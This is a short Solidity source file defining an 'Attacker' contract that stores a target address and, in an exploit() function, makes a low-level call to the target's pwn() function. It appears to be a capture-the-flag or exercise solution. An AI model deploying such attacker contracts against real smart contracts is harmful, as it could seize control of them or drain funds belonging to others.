// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

contract Attacker {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    receive() external payable {}

    function exploit() public payable {
        target.call(abi.encodeWithSignature("pwn()"));
    }
}
